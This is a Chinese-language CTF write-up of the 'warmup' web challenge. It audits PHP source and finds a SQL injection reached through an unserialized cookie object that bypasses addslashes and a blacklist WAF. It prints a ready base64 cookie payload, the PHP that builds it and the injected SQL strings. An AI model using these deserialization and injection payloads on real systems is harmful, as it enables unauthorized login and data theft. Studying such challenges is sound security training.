---
title: CTF刷题(2): warmup(web, Hard 5)
date: 2023/10/08
tags:
- ctf
- web
---

攻防世界，题目名称-warmup

# 审题

代码审计题，给出了源码。

界面是一个简洁的php登录页面，从浏览器侧，可以看到的值得注意的点只有cookie，cookie的意义暂时不清楚，需要看一下源码。

源码也非常简单，发现两处可能可以注入的点

**1. 反序列化，是ctf常出的点了，不知道php是什么机制**

![image-20231008001731783](.\images\image-20231008001731783.png)

**2. sql查询的username和password可以直接被请求参数控制，并且sql语句用的是字符串拼接，可能存在校验漏洞**

![image-20231008002207823](.\images\image-20231008002207823.png)

![image-20231008002238239](.\images\image-20231008002238239.png)

接下来就需要尝试解体了

# 解题步骤

## 准备环境

解题之前需要本地尝试，先把`php-fpm`+`nginx`环境准备好，启动`php-fpm`通过`nginx`设置反向代理，把http请求转发到`php-fpm`处理

## post请求突破点

经过多番尝试发现确实`waf`函数代码存在些问题，所有的if语句都无法拦截到`strripos`返回0的情况，也就是黑名单列表里的关键字仅位于字符串开头的情况无法被拦截住，但是也仅止步于此了，`addslash`+`黑名单`的拦截确实找不到突破口

其中尝试了一个宽字节注入的知识点，即url编码的`%5d`解码后若其后存在`\`并且作为字符串拼接到sql语句中，在默认为`GBK`编码的mysql中会将`%5d`与其后的`\`整体识别为一个字符，这样就规避了`\`的转义，但由于`waf`校验的存在，此处显然无法使用这个

![image-20231008002624918](.\images\image-20231008002624918.png)

另外在SQL类发现一个奇怪的`__wakeup`成员，不太了解这是什么，就去搜索了一下，发现是反序列相关的，那么认为突破点很可能就在反序列化那一处

## 反序列化突破点

审计`__wakeup`函数发现反序列化时会进行一次连接并且`check_login`，要知道，反序列化是不会走`addslash`那一步的并且`check_login`中会输出flag

因此现在需要尝试的就是在尝试在序列化字符串中进行sql注入，尝试注入，成功

![image-20231008010232907](.\images\image-20231008010232907.png)

# payload

修改cookie内容为

`last_login_info=TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6MTM6Iicgb3IgdHJ1ZSBvciAiO3M6ODoicGFzc3dvcmQiO3M6NDoib3IgJyI7czo0OiJjb25uIjtOO30=`

再发一次请求即可。

主要是将如下内容序列化后base64插入到cookie中得到的

```php
<?php
include "conn.php";
$sql = new SQL();
$sql->table = "users";
$sql->username = "' or true or ";
$sql->password = "or '";
echo serialize($sql);
?>
```

拼接得到的就是如下字符串了，能查出所有用户

`select username,password from users where username='' or true or ' and password=' or ''`

当然如下也可以

```php
<?php
include "conn.php";
$sql = new SQL();
$sql->table = "users";
$sql->username = "admin' and ' and password='=";
// 前面提到过waf函数无法校验黑名单关键字仅位于字符串开头的情况
$sql->password = "#";
echo serialize($sql);
?>
```

拼接得到的结果如下

`select username,password from users where username='admin' and ' and password='=' and password='#'`